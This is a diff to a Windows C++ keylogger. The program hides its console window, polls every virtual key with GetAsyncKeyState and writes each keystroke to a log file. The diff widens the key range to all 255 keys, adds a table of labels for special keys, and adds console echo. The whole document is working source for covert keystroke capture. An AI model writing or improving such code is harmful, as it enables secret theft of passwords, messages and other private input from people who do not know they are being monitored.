@@ -2,7 +2,25 @@
 #include <fstream>
 #include <windows.h>
 #include <cctype>
+#include <map>
 
+std::map<int, std::string> myMap = {
+    {1, "#LCK#"},
+    {2, "#RCK#"},
+    {9, "#TAB#"},
+    {13, "#ENT#"},
+    {16, " "},
+    {20, "#CPL#"},
+    {32, "#SPC#"},
+    {33, "#PUP#"},
+    {34, "#PDN#"},
+    {37, "#LFA#"},
+    {38, "#DNA#"},
+    {39, "#RTA#"},
+    {40, "#UPA#"},
+    {91, "#WIN#"},
+    {255, "#FNC#"},
+};
 
 void hideConsole(){
     // get the console window handle
@@ -19,6 +37,7 @@ int main(){
     bool key_state[256] = {true}; // array to track key states
     char key_char = ' ';
     
+    
 
     hideConsole();
 
@@ -33,25 +52,25 @@ int main(){
     while (true) {
 
         // check each key
-        for (int key = 1; key <= 135; key++) {
+        for (int vkey = 1; vkey <= 255; vkey++) {
 
             // check if key pressed
-            if (GetAsyncKeyState(key) & 0x8000) {
+            if (GetAsyncKeyState(vkey) & 0x8000) {
                 
-                if (key_state[key]) {
+                if (key_state[vkey]) {
                     continue; // skip this key if already pressed
                 }
-
-                key_char = MapVirtualKey(key, 2);
+                std::cout << vkey;
+                key_char = MapVirtualKey(vkey, MAPVK_VK_TO_CHAR);
                 
-                if (!key_state[VK_SHIFT]) { keylog << (char) tolower(key_char);}
-                else{ keylog << key_char;}
+                if (!key_state[VK_SHIFT]) { keylog << (char) tolower(key_char); std::cout << (char) tolower(key_char);}
+                else{ keylog << key_char; std::cout << key_char;}
                 
                 keylog.flush(); // flush the output to the file
-
-                key_state[key] = true; // update key state
+                
+                key_state[vkey] = true; // update key state
             } else {
-                key_state[key] = false; // update key state 
+                key_state[vkey] = false; // update key state 
             }   
         }
 
